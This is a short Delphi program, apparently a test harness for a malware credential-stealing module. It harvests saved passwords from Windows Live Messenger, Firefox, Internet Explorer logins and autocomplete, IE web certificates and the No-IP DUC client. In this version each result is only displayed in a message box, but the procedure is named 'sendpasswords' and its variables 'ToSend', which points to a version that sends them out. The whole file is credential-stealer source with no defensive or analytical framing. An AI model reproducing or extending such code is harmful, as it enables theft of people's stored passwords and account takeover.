program Passwords;

uses
  windows,
  UnitPasswords;

procedure sendpasswords(P: pointer);
var
  ToSend1,
  ToSend2,
  ToSend3,
  ToSend4,
  ToSend5,
  ToSend6,
  ToSend7: string;
  Tamanho: cardinal;
begin
  sleep(100);

  ToSend1 := GetWindowsLiveMessengerPasswords;
  messagebox(0, pchar('1: ' + tosend1), '', 0);

  ToSend3 := GetFirefoxPasswords;
  messagebox(0, pchar('2: ' + tosend3), '', 0);

  ToSend7 := GetIELoginPass;
  messagebox(0, pchar('3: ' + tosend7), '', 0);

  ToSend6 := GrabAllIEpasswords;
  messagebox(0, pchar('4: ' + tosend6), '', 0);

  ToSend4 := ShowAllIeAutocompletePWs;
  messagebox(0, pchar('5: ' + tosend4), '', 0);

  ToSend5 := ShowAllIEWebCert;
  messagebox(0, pchar('6: ' + tosend5), '', 0);

  ToSend2 := noip_DUCpasswords;
  messagebox(0, pchar('7: ' + tosend2), '', 0);
end;

begin
  sendpasswords(nil);
end.